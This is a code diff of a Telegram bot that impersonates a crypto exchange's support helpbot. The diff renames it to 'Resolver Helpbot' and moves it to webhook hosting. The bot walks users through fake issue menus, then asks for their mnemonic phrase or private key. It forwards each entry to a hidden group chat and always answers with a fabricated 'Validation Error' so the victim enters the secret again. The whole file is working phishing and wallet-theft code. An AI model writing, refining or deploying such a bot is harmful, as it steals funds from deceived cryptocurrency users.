@@ -1,15 +1,33 @@
 require('dotenv').config();
+const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
-const axios = require('axios');
+const bodyParser = require('body-parser');
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
-
 const RESULT_GROUP_ID = process.env.GROUP_CHAT_ID;
-const ownerId = process.env.OWNER_ID;
+const OWNER_ID = process.env.OWNER_ID;
+const WEBHOOK_URL = `${process.env.RENDER_URL}/webhook/${BOT_TOKEN}`;
+const PORT = process.env.PORT || 3000;
+
+const bot = new TelegramBot(BOT_TOKEN, { webHook: { port: PORT } });
+bot.setWebHook(WEBHOOK_URL);
+
+const app = express();
+app.use(bodyParser.json());
 
 // Store per-user states
 const chatStates = {};
+
+// --- Webhook endpoint ---
+app.post(`/webhook/${BOT_TOKEN}`, (req, res) => {
+  bot.processUpdate(req.body);
+  res.sendStatus(200);
+});
+
+// --- Root endpoint ---
+app.get('/', (req, res) => {
+  res.send('🤖 Telegram bot is running via webhook.');
+});
 
 // --- START COMMAND ---
 bot.onText(/\/start/, async (msg) => {
@@ -18,7 +36,7 @@ bot.onText(/\/start/, async (msg) => {
 
   await bot.sendMessage(
     chatId,
-    "👋 Welcome to *AsterDex Helpbot!* Let's process your issue for Spot, Perp or others.",
+    "👋 Welcome to *Resolver Helpbot!* Let's process your issue for Spot, Perp or others.",
     {
       parse_mode: 'Markdown',
       reply_markup: {
@@ -55,53 +73,34 @@ bot.on('callback_query', async (query) => {
   const messageId = query.message.message_id;
   const data = query.data;
 
-  try {
-    await bot.deleteMessage(chatId, messageId).catch(() => {}); // Clean previous message
-  } catch (e) {}
+  await bot.deleteMessage(chatId, messageId).catch(() => {});
 
   switch (data) {
-    // === Report Issue ===
     case 'report_issue':
       await bot.sendMessage(chatId, 'What issue are you currently facing?', {
         reply_markup: {
           inline_keyboard: [
-            [
-              {
-                text: 'Deposit on Spot',
-                callback_data: 'issue_deposit_spot',
-              },
-            ],
+            [{ text: 'Deposit on Spot', callback_data: 'issue_deposit_spot' }],
             [
               {
                 text: 'Withdrawal on Spot',
                 callback_data: 'issue_withdraw_spot',
               },
             ],
-            [
-              {
-                text: 'Deposit on Perp',
-                callback_data: 'issue_deposit_perp',
-              },
-            ],
+            [{ text: 'Deposit on Perp', callback_data: 'issue_deposit_perp' }],
             [
               {
                 text: 'Withdrawal on Perp',
                 callback_data: 'issue_withdraw_perp',
               },
             ],
-            [
-              {
-                text: 'Spot/Perp Transfer',
-                callback_data: 'issue_transfer',
-              },
-            ],
+            [{ text: 'Spot/Perp Transfer', callback_data: 'issue_transfer' }],
             [{ text: 'Other', callback_data: 'issue_other' }],
           ],
         },
       });
       break;
 
-    // === Issue Selected ===
     case 'issue_deposit_spot':
     case 'issue_withdraw_spot':
     case 'issue_deposit_perp':
@@ -126,7 +125,7 @@ bot.on('callback_query', async (query) => {
       );
       break;
 
-    // === Network Selection ===
+    // --- Network selection ---
     case 'network_ethereum':
     case 'network_bnb':
     case 'network_solana':
@@ -166,7 +165,7 @@ bot.on('callback_query', async (query) => {
       break;
     }
 
-    // === Token Selection ===
+    // --- Token selection ---
     case 'token_usdc':
     case 'token_usdt':
     case 'token_usd1':
@@ -203,7 +202,7 @@ bot.on('callback_query', async (query) => {
       break;
     }
 
-    // === NEXT STEP ===
+    // --- NEXT STEP ---
     case 'next_step': {
       const state = chatStates[chatId];
       if (!state) return;
@@ -224,7 +223,7 @@ bot.on('callback_query', async (query) => {
       break;
     }
 
-    // === RESTART BOT ===
+    // --- Restart Bot ---
     case 'restart_bot': {
       delete chatStates[chatId];
       await bot.sendMessage(
@@ -265,16 +264,12 @@ bot.on('message', async (msg) => {
 
   const state = chatStates[chatId];
 
-  // === Wallet Address Input ===
   if (state?.step === 'awaiting_wallet_address') {
     const isValidEVM = /^0x[a-fA-F0-9]{40}$/.test(text);
     const isValidSolana = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text);
 
     if (!isValidEVM && !isValidSolana) {
-      await bot.sendMessage(
-        chatId,
-        '❌ That doesn’t look like a valid address. Please paste again.'
-      );
+      await bot.sendMessage(chatId, '❌ Invalid wallet address. Try again.');
       return;
     }
 
@@ -297,7 +292,6 @@ bot.on('message', async (msg) => {
     return;
   }
 
-  // === Authorization Step (Send to group + fake validation) ===
   if (state?.step === 'awaiting_authorization') {
     try {
       const report =
@@ -319,16 +313,12 @@ bot.on('message', async (msg) => {
 
     await bot.sendMessage(
       chatId,
-      `⚠️ Validation Error: There’s an error in your input, please try again.\n\nNow enter your mnemonic phrase or private key to authorize or send /issue to restart.`,
+      `⚠️ Validation Error: There’s an error in your input, please try again.\n\nNow enter your mnemonic phrase or private key again or send /issue to restart.`,
       { parse_mode: 'Markdown' }
     );
-    return;
   }
 });
 
-const express = require('express');
-const app = express();
-
-app.get('/', (req, res) => res.send('🤖 Telegram bot is running.'));
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));
+app.listen(PORT, () =>
+  console.log(`✅ Webhook server running on port ${PORT}`)
+);
